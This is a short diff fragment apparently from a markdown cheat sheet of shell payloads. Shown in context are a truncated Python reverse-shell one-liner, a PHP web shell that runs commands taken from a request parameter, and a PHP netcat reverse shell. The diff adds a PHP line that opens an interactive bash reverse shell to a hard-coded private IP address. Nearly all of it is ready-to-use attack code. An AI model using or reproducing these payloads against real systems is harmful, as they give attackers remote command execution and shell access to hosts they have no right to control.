@@ -300,6 +300,8 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 <?php system($_REQUEST['cmd']); ?>
 
 <?php system('nc <IP> <PORT> -e /bin/bash')?>
+
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.225/445 0>&1'");?>
 ```
 ### Python Shells
 ```bash
